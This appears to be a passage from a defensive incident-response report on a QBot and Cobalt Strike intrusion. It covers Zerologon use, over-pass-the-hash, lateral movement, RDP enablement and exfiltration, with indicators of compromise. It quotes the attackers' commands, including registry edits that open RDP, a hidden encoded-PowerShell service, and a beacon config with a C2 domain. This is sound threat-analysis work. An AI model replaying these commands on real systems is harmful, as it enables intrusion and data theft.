<p><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-16.png"><img loading="lazy" decoding="async" class="size-full wp-image-5572 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-16.png" alt="" width="1014" height="1009" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-16.png 1014w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-16-300x300.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-16-150x150.png 150w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-16-768x764.png 768w" sizes="auto, (max-width: 1014px) 100vw, 1014px" /></a></p>
<p><span class="ql-comment" data-comment-ids="985565833" data-comment-unresolved-ids="">The PasswordLastSet field is equal to the TimeCreated field, meaning that the password of the domain controller was successfully updated. </span>We can also see that the SubjectUserName is ANONYMOUS LOGON.</p>
<p><span class="ql-comment" data-comment-ids="985696266" data-comment-unresolved-ids="">A connection was performed from the </span><span class="ql-comment" data-comment-ids="985566077,985696266" data-comment-unresolved-ids="">beachhead </span><span class="ql-comment" data-comment-ids="985696266" data-comment-unresolved-ids="">to the Domain Controller using the DC account. </span>After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.</p>
<p class="ql-block" data-block-id="block-ad9c7486-1f09-4caa-8f69-4c931cf9d8e6"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-17.png"><img loading="lazy" decoding="async" class="size-full wp-image-5573 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-17.png" alt="" width="1664" height="722" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-17.png 1664w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-17-300x130.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-17-1024x444.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-17-768x333.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-17-1536x666.png 1536w" sizes="auto, (max-width: 1664px) 100vw, 1664px" /></a></p>
<p>The explorer shell was also restarted by the threat actor:</p>
<p class="ql-block" data-block-id="block-ab526a3b-d758-4839-b410-5e17aa949a8c"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-18.png"><img loading="lazy" decoding="async" class="size-full wp-image-5574 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-18.png" alt="" width="1330" height="625" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-18.png 1330w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-18-300x141.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-18-1024x481.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-18-768x361.png 768w" sizes="auto, (max-width: 1330px) 100vw, 1330px" /></a></p>
<h3 data-block-id="block-ec899534-e043-44d5-9e87-a30f3f30e9d4"></h3>
<h3 class="ql-heading" data-block-id="block-ec899534-e043-44d5-9e87-a30f3f30e9d4">Defense Evasion</h3>
<p class="ql-block" data-block-id="block-050d11be-c7b3-459a-817f-05a70e3e41cd">Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.</p>
<p class="ql-block" data-block-id="block-c89b6815-a92f-4e03-ae88-58c77eb237f4"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-21.png"><img loading="lazy" decoding="async" class="size-full wp-image-5577 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-21.png" alt="" width="539" height="635" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-21.png 539w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-21-255x300.png 255w" sizes="auto, (max-width: 539px) 100vw, 539px" /></a></p>
<p class="ql-block" data-block-id="block-105378fb-aafb-4aa0-87f8-5039118ebb63">The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.</p>
<div class="ql-block" data-block-id="block-41e2e9bb-294b-4492-a31a-3b08b8efdb64"></div>
<p><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-22.png"><img loading="lazy" decoding="async" class="size-full wp-image-5578 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-22.png" alt="" width="875" height="759" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-22.png 875w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-22-300x260.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-22-768x666.png 768w" sizes="auto, (max-width: 875px) 100vw, 875px" /></a></p>
<p>&nbsp;</p>
<h4 class="ql-heading" data-block-id="block-9e126b1f-2d15-497d-99a7-41235c688733">Over-Pass-the-Hash from Beachhead</h4>
<p class="ql-block" data-block-id="block-64cf4d77-e945-424f-86cd-2fafa1313da5">The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash <span class="ql-comment" data-comment-ids="985566233" data-comment-unresolved-ids="">to request a TGT from the domain controller.</span> We have seen the use of over-pass-the-hash several times before. For example, our <a class="ql-link" href="https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/" target="_blank" rel="noopener noreferrer">Cobalt Strike Defender Guide </a><span data-void-detect="true">covers detection of this technique in more detail.</span></p>
<p class="ql-block" data-block-id="block-4f978a97-9300-467f-863e-f3084c9d301b"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-19.png"><img loading="lazy" decoding="async" class="size-full wp-image-5575 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-19.png" alt="" width="511" height="714" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-19.png 511w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-19-215x300.png 215w" sizes="auto, (max-width: 511px) 100vw, 511px" /></a></p>
<p>Soon after, a TGT for the administrator account was requested:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-20.png"><img loading="lazy" decoding="async" class="size-full wp-image-5576 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-20.png" alt="" width="645" height="537" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-20.png 645w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-20-300x250.png 300w" sizes="auto, (max-width: 645px) 100vw, 645px" /></a></p>
<h3 data-block-id="block-ec899534-e043-44d5-9e87-a30f3f30e9d4"></h3>
<h3 class="ql-heading" data-block-id="block-99b2787a-7b01-4669-b123-5a9c09275a99">Discovery</h3>
<p>QBot initially starts a number of processes to collect information about the affected system. This is part of the &#8220;SYSTEM INFO&#8221; bot request, as described in a recent article from <a class="ql-link" href="https://securelist.com/qakbot-technical-analysis/103931/" target="_blank" rel="noopener noreferrer">SecureList</a><span data-void-detect="true">.</span></p>
<p class="ql-block" data-block-id="block-cde40f5b-2967-4d41-8177-d5792ed9eed2"><img loading="lazy" decoding="async" class="size-full wp-image-5579 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-23.png" alt="" width="864" height="487" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-23.png 864w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-23-300x169.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-23-768x433.png 768w" sizes="auto, (max-width: 864px) 100vw, 864px" /><br />
Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.</p>
<p data-block-id="block-8d257531-db6a-488c-94d8-324849c46b12"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-24.png"><img loading="lazy" decoding="async" class="size-full wp-image-5580 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-24.png" alt="" width="868" height="239" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-24.png 868w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-24-300x83.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-24-768x211.png 768w" sizes="auto, (max-width: 868px) 100vw, 868px" /></a></p>
<p class="ql-heading" data-block-id="block-2f2aa1fd-8986-4653-bbc5-6a920bf5978b"><span class="ql-comment" data-comment-ids="985569152,985572473" data-comment-unresolved-ids="">ADFind </span><span class="ql-comment" data-comment-ids="985572473" data-comment-unresolved-ids="">(renamed in find.exe) used to enumerate computers</span></p>
<pre>C:\redacted\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName</pre>
<p><img loading="lazy" decoding="async" class="size-full wp-image-5581 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-25.png" alt="" width="1136" height="222" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-25.png 1136w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-25-300x59.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-25-1024x200.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-25-768x150.png 768w" sizes="auto, (max-width: 1136px) 100vw, 1136px" /></p>
<p><span class="ql-comment" data-comment-ids="985569232" data-comment-unresolved-ids="">On the Domain Controller, the threat actors gathered information about the installed security software through WMI:</span></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-26.png"><img loading="lazy" decoding="async" class="size-full wp-image-5582 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-26.png" alt="" width="1452" height="131" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-26.png 1452w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-26-300x27.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-26-1024x92.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-26-768x69.png 768w" sizes="auto, (max-width: 1452px) 100vw, 1452px" /></a></p>
<pre>C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct GET /value
C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH FirewallProduct GET /value</pre>
<p class="ql-heading" data-block-id="block-8a2da997-9f2b-46f5-b024-1329655d3d11">Ping was used to verify machines were online</p>
<pre>ping -n 1 [REDACTED]</pre>
<h3 class="ql-heading" data-block-id="block-c3d38e80-398c-42b7-920b-b566e2f72952">Lateral Movement</h3>
<div class="ql-block" data-block-id="block-9e27e794-3cd6-4bb3-ad8a-932dfcf3d7e8">Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.</div>
<pre>EventCode: 7045
Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand &lt;redacted&gt;
User: NT AUTHORITY\SYSTEM
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe</pre>
<p class="ql-block" data-block-id="block-9a5ca423-eebd-4677-8d9b-e1a4585d6bd9"><span class="ql-comment" data-comment-ids="985569248" data-comment-unresolved-ids="">On the first Domain Controller, a Cobalt Strike service was installed:</span></p>
<p class="ql-block" data-block-id="block-6e3c6342-cfbe-473b-a39c-5b029aea986d"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-27.png"><img loading="lazy" decoding="async" class="size-full wp-image-5583 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-27.png" alt="" width="1248" height="782" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-27.png 1248w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-27-300x188.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-27-1024x642.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-27-768x481.png 768w" sizes="auto, (max-width: 1248px) 100vw, 1248px" /></a></p>
<pre data-block-id="block-cf2ebfef-cca2-4906-be37-38e0505bcd2f">Log Source: Microsoft-Windows-Service Control Manager Event ID:7045</pre>
<p class="ql-block" data-block-id="block-cf2ebfef-cca2-4906-be37-38e0505bcd2f">Multiple services were installed by Cobalt Strike across the environment, here are a few examples:</p>
<pre>HKLM\System\CurrentControlSet\Services\3141131\ImagePath 
HKLM\System\CurrentControlSet\Services\af5ff02\ImagePath 
HKLM\System\CurrentControlSet\Services\c46234f\ImagePath</pre>
<p class="ql-block" data-block-id="block-4da65bd0-5a04-4ca8-8a64-5d53a810b01d"><span class="ql-comment" data-comment-ids="985569361" data-comment-unresolved-ids="">Cobalt Strike</span> first calls <strong><span class="ql-comment" data-comment-ids="985569360" data-comment-unresolved-ids="">OpenSCManagerW</span></strong> to create the service remotely, then starts it with <strong>StartServiceA</strong> function:</p>
<div class="ql-block" data-block-id="block-5e30d48a-0afa-495f-9bb7-9098057c09a2"></div>
<div class="ql-block" data-block-id="block-a9407109-8cf5-40a5-be5e-29fa94ebb353"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-28.png"><img loading="lazy" decoding="async" class="size-full wp-image-5584 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-28.png" alt="" width="2581" height="780" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-28.png 2581w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-28-300x91.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-28-1024x309.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-28-768x232.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-28-1536x464.png 1536w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-28-2048x619.png 2048w" sizes="auto, (max-width: 2581px) 100vw, 2581px" /></a></div>
<h4 data-block-id="block-1e60a30f-d2ed-47b4-a300-e362f1e84e3d"></h4>
<h4 class="ql-heading" data-block-id="block-1e60a30f-d2ed-47b4-a300-e362f1e84e3d">RDP/interactive Logins</h4>
<p class="ql-block" data-block-id="block-bc401444-ec49-44c7-89f9-99bdfeb9f9f6"><span class="ql-comment" data-comment-ids="985569369" data-comment-unresolved-ids="">Various commands were executed to enable the RDP service on various hosts:</span></p>
<p data-block-id="block-bc401444-ec49-44c7-89f9-99bdfeb9f9f6">Increase the max RDP connections allowed, in this case a arbitrarily large number.</p>
<pre>REG  ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v "MaxInstanceCount" /d 0xffffffff /f</pre>
<div class="ql-block" data-block-id="block-8a2a8df2-0115-46de-9ac2-b01ef882f93b"></div>
<div data-block-id="block-8a2a8df2-0115-46de-9ac2-b01ef882f93b">Makes sure the RDP listener is enabled.</div>
<pre>REG  ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v "fEnableWinStation" /d 1 /f</pre>
<div class="ql-block" data-block-id="block-7a4a42f2-4cfb-4f1d-8f9d-36a679fd7f12"></div>
<div data-block-id="block-7a4a42f2-4cfb-4f1d-8f9d-36a679fd7f12">Makes sure the user is allowed to RDP to the terminal server.</div>
<pre>REG  ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSUserEnabled" /d 0 /f</pre>
<div class="ql-block" data-block-id="block-2166ada2-9bef-4194-9127-c6417e1c1b57"></div>
<div data-block-id="block-2166ada2-9bef-4194-9127-c6417e1c1b57">Makes sure the terminal server is set to enabled.</div>
<pre>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSEnabled" /d 1 /f</pre>
<div class="ql-block" data-block-id="block-cc3dd758-e672-46de-bedc-7d6316af184d"></div>
<div data-block-id="block-cc3dd758-e672-46de-bedc-7d6316af184d">Makes sure terminal services is set to remote admin mode.</div>
<pre>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSAppCompat" /d 0 /f</pre>
<div class="ql-block" data-block-id="block-c0b7d6df-057f-446e-a697-63785e2c85d9"></div>
<div data-block-id="block-c0b7d6df-057f-446e-a697-63785e2c85d9">
<div class="ql-block" data-block-id="block-87f5f6b3-7487-42e0-aa34-294d4986c744">Makes sure that the terminal service will start idle sessions.</div>
<div data-block-id="block-87f5f6b3-7487-42e0-aa34-294d4986c744"></div>
</div>
<pre>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "IdleWinStationPoolCount" /d 1 /f</pre>
<div data-block-id="block-87f5f6b3-7487-42e0-aa34-294d4986c744">Enables advertisement of the terminal server.</div>
<pre>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSAdvertise" /d 1 /f</pre>
<div class="ql-block" data-block-id="block-e00a3da2-d145-4cd1-9b10-1c8f277f576e"></div>
<div data-block-id="block-e00a3da2-d145-4cd1-9b10-1c8f277f576e">Makes sure terminal server is set to allow connections.</div>
<pre>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "AllowTSConnections" /d 1 /f</pre>
<div class="ql-block" data-block-id="block-0cb51f3d-e864-4694-a29a-036fc57d3ad2"></div>
<div data-block-id="block-0cb51f3d-e864-4694-a29a-036fc57d3ad2">Makes sure terminal server is set to simultaneous sessions.</div>
<pre>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /t REG_DWORD /v "EnableConcurrentSessions" /d 1 /f</pre>
<div class="ql-block" data-block-id="block-df8f18bb-991b-44f3-9b7d-f369a2f80acb"></div>
<div data-block-id="block-df8f18bb-991b-44f3-9b7d-f369a2f80acb">Makes sure multiple sessions are allowed.</div>
<pre>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "fSingleSessionPerUser" /d 0 /f</pre>
<div class="ql-block" data-block-id="block-831830bf-4346-48db-bca7-037f022467bc"></div>
<div data-block-id="block-831830bf-4346-48db-bca7-037f022467bc">Starts the terminal services and sets service to autostart.</div>
<pre>sc config termservice start= auto
net  start termservice /y</pre>
<p class="ql-block" data-block-id="block-b107ed9a-9daa-4c4c-946b-d73b5784603c"><span class="ql-comment" data-comment-ids="985569375" data-comment-unresolved-ids="">The threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.</span></p>
<p class="ql-block" data-block-id="block-2c2d4d7b-c6df-4477-9add-d27beda30c71"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-29.png"><img loading="lazy" decoding="async" class="size-full wp-image-5585 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-29.png" alt="" width="568" height="794" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-29.png 568w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-29-215x300.png 215w" sizes="auto, (max-width: 568px) 100vw, 568px" /></a></p>
<pre>LogName=Security
EventCode=4624
Logon Type=10 (Remote Interactive Logon - RDP)</pre>
<h3 class="ql-heading" data-block-id="block-45201a46-909c-40ae-a36f-8fc82a993ca2">Named pipe (SMB)</h3>
<p class="ql-block" data-block-id="block-65b26320-7aa7-4548-8c15-8e64ff7fd45a">The base64 encoded payload can be decoded using this Cyberchef <a class="ql-link" href="https://gist.github.com/0xtornado/69d12572520122cb9bddc2d6793d97ab" target="_blank" rel="noopener noreferrer">recipe</a><span data-void-detect="true"> (shout out </span><a class="ql-link" href="https://twitter.com/0xtornado" target="_blank" rel="noopener noreferrer">@0xtornado</a><span data-void-detect="true">) which represents a SMB beacon that creates the named pipe &#8220;dce_3d&#8221;.</span></p>
<p class="ql-block" data-block-id="block-86a265d3-b056-4a65-8aaf-03d964aadd8e"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-30.png"><img loading="lazy" decoding="async" class="size-full wp-image-5586 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-30.png" alt="" width="1269" height="153" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-30.png 1269w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-30-300x36.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-30-1024x123.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-30-768x93.png 768w" sizes="auto, (max-width: 1269px) 100vw, 1269px" /></a></p>
<p class="ql-block" data-block-id="block-a12f297e-683a-4a10-bf0a-b5693152b805"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-31.png"><img loading="lazy" decoding="async" class="size-full wp-image-5587 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-31.png" alt="" width="474" height="422" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-31.png 474w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-31-300x267.png 300w" sizes="auto, (max-width: 474px) 100vw, 474px" /></a></p>
<div data-block-id="block-a12f297e-683a-4a10-bf0a-b5693152b805"></div>
<pre>LogName=Microsoft-Windows-System/Operational
EventCode=17
TaskCategory=Pipe Created (rule: PipeEvent)</pre>
<h3 class="ql-heading" data-block-id="block-47587135-4b06-47cd-aaea-f9f567751431">Command and Control</h3>
<h4 class="ql-heading" data-block-id="block-421fe853-b10d-4db5-aa01-af69423677fd">QBot details &#8211; 24.229.150.54 // 41.228.22.180</h4>
<div class="ql-block" data-block-id="block-92973ced-d531-4fd3-aefc-619fd130feea">24.229.150[.]54:995 / <span data-void-detect="true">avlhestito[.]us</span></div>
<pre>Certificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce
Not Before  2021/11/15 09:24:49 UTC 
Not After  2022/11/15 13:18:32 UTC 
Issuer Org  Rsc Inpye LLC. 
Subject Common  avlhestito[.]us
Public Algorithm  rsaEncryption
JA3: c35a61411ee5bdf666b4d64b05c29e64
JA3s: 7c02dbae662670040c7af9bd15fb7e2f</pre>
<div class="ql-block" data-block-id="block-43c7f355-f4f8-48e0-b3f4-ef05ff214a49">41.228.22[.]180:443 / <span data-void-detect="true">xrhm[.]info </span></div>
<pre>Certificate:	96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7
Not 	Before:  2021/11/12 04:34:10 UTC 
Not After:  	2022/11/12 10:08:57 UTC 
Issuer Org:  Bqatra Bamito Inc. 
Subject Common:  xrhm[.]info
Public Algorithm:  rsaEncryption
JA3:  c35a61411ee5bdf666b4d64b05c29e64
JA3s: 7c02dbae662670040c7af9bd15fb7e2f</pre>
<p class="ql-block" data-block-id="block-f5942661-91fd-4d45-aa23-7089e240d30f">Here is the initial access DLL (Qbot) information from <a class="ql-link" href="https://tria.ge/211115-r554waafe6/behavioral2" target="_blank" rel="noopener noreferrer">Tria.ge</a></p>
<p class="ql-block" data-block-id="block-84f37295-d7ef-4142-97f7-5cfe960c0a12"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-32.png"><img loading="lazy" decoding="async" class="size-full wp-image-5588 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-32.png" alt="" width="1599" height="930" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-32.png 1599w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-32-300x174.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-32-1024x596.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-32-768x447.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-32-1536x893.png 1536w" sizes="auto, (max-width: 1599px) 100vw, 1599px" /></a></p>
<p class="ql-block" data-block-id="block-23ff47db-db30-4e63-aab6-de56c5f6e66f">Cobalt Strike details &#8211; 5.255.98[.]144</p>
<p class="ql-block" data-block-id="block-23ff47db-db30-4e63-aab6-de56c5f6e66f">This Cobalt Strike server was added to our <a class="ql-link" href="https://thedfirreport.com/services/" target="_blank" rel="noopener noreferrer">Threat Feed</a><span data-void-detect="true"> on 2021-11-16.</span></p>
<div class="ql-block" data-block-id="block-dd48afea-5d47-4111-921a-0b751a4f6b30">5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / <span data-void-detect="true">dxabt[.]com</span></div>
<pre>Certificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ]
Not Before: 2021/11/07 03:00:53 UTC  	
Not After: 2022/02/05 03:00:52 UTC  	
Issuer Org: Let's Encrypt  	
Subject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com
Public Algorithm: rsaEncryption
JA3: 0eecb7b1551fba4ec03851810d31743f
JA3s: ae4edc6faf64d08308082ad26be60767</pre>
<div class="ql-block" data-block-id="block-97c2fa1e-fae9-4675-b7b4-36120f82c7c3">Config:</div>
<pre>{
    "x64": {
        "uri_queried": "/tRPG",
        "sha256": "dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb",
        "config": {
            "HTTP Method Path 2": "/faq",
            "Jitter": 79,
            "C2 Server": "dxabt[.]com,/case",
            "Spawn To x86": "%windir%\\syswow64\\runonce.exe",
            "Method 1": "GET",
            "C2 Host Header": "",
            "Method 2": "POST",
            "Watermark": 426352781,
            "Spawn To x64": "%windir%\\sysnative\\runonce.exe",
            "Beacon Type": "8 (HTTPS)",
            "Port": 443,
            "Polling": 53988
        },
        "time": 1637416040175.3,
        "md5": "30cc71d5b5d7778774c54486558690d3",
        "sha1": "5f36c6cffdbae0d631c8889b4d9bad1248f899b3"
    },
    "x86": {
        "uri_queried": "/Mr0m",
        "sha256": "a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f",
        "config": {
            "HTTP Method Path 2": "/faq",
            "Jitter": 79,
            "C2 Server": "dxabt[.]com,/case",
            "Spawn To x86": "%windir%\\syswow64\\runonce.exe",
            "Method 1": "GET",
            "C2 Host Header": "",
            "Method 2": "POST",
            "Watermark": 426352781,
            "Spawn To x64": "%windir%\\sysnative\\runonce.exe",
            "Beacon Type": "8 (HTTPS)",
            "Port": 443,
            "Polling": 53988
        },
        "time": 1637416038974.9,
        "md5": "c1fd49c043894c1dff8bc02b17f8942c",
        "sha1": "e915f74be310b1687db6b290af2f78583a981512"
    }
}</pre>
<h3 class="ql-heading" data-block-id="block-4abba1d9-7746-47c1-9dc4-d9d0b7dad99f">Exfiltration</h3>
<p class="ql-block" data-block-id="block-80b6ca4a-ca19-47ce-9ace-09a808fa353f">While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment.</p>
<p class="ql-block" data-block-id="block-d2c30852-35ce-4fc8-aa6b-4d783e87690d"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-33.png"><img loading="lazy" decoding="async" class="size-full wp-image-5589 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-33.png" alt="" width="234" height="172" /></a></p>
<p class="ql-block" data-block-id="block-ddb37d2d-529c-46fb-a3b1-63de51eb8967">The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.</p>
<div class="ql-block" data-block-id="block-5eed6324-a64e-4867-8578-d7d8c1f92e3f"></div>
<p class="ql-block" data-block-id="block-8bd8218e-d517-4e83-8d48-0915e1e9a327">The C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.</p>
<p class="ql-block" data-block-id="block-0dfc2252-ef7e-49af-8ad9-4c9b91cb545c"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-34.png"><img loading="lazy" decoding="async" class="size-full wp-image-5590 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-34.png" alt="" width="1600" height="290" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-34.png 1600w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-34-300x54.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-34-1024x186.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-34-768x139.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-34-1536x278.png 1536w" sizes="auto, (max-width: 1600px) 100vw, 1600px" /></a></p>
<p>At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.</p>
<p><span class="ql-comment" data-comment-ids="985569434" data-comment-unresolved-ids="">According to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.</span></p>
<div data-block-id="block-a03aa89f-fd92-4205-b100-23a015ab4844"></div>
<p class="ql-block" data-block-id="block-89035463-1403-467d-acf8-3125ce1b05a5"><a href="https://thedfirreport.com/wp-content/uploads/2022/02/8734-35.png"><img loading="lazy" decoding="async" class="size-full wp-image-5591 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/02/8734-35.png" alt="" width="600" height="143" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/8734-35.png 600w, https://thedfirreport.com/wp-content/uploads/2022/02/8734-35-300x72.png 300w" sizes="auto, (max-width: 600px) 100vw, 600px" /></a></p>
<p class="ql-block" data-block-id="block-ff50d57c-3091-4276-ab07-4ca77d383f2e">Spike in traffic from file share server to Cobalt Strike command and control server.</p>
<div data-block-id="block-ff50d57c-3091-4276-ab07-4ca77d383f2e"></div>
<h3 class="ql-heading" data-block-id="block-96bcf297-3a0c-4339-965c-72c12c7fa461">IOCs</h3>
<h3 class="ql-heading" data-block-id="block-3ade0729-2807-47ac-b365-3882553df4bf">Network</h3>
<pre>QBOT
24.229.150[.]54:995  - avlhestito[.]us
41.228.22[.]180:443 - xrhm[.]info 

Cobalt Strike
5.255.98[.]144:8888 / dxabt[.]com
5.255.98[.]144:443 / dxabt[.]com
5.255.98[.]144:8080 / dxabt[.]com</pre>
